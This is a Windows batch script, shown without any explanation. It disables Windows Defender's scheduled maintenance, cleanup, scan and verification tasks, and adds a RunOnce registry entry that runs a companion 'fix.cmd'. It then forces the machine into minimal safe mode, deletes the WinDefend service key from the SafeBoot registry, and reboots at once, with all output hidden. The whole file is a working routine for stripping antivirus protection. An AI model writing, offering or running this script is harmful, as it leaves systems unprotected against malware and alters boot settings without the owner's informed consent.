@echo off
cd /d "%~dp0"
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /disable >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "*ddf-fix" /t REG_SZ /d "%~dp0fix.cmd" /f >nul 2>&1
bcdedit /set {current} safeboot minimal >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\WinDefend" /f >nul 2>&1
shutdown -f -r -t 0 >nul 2>&1
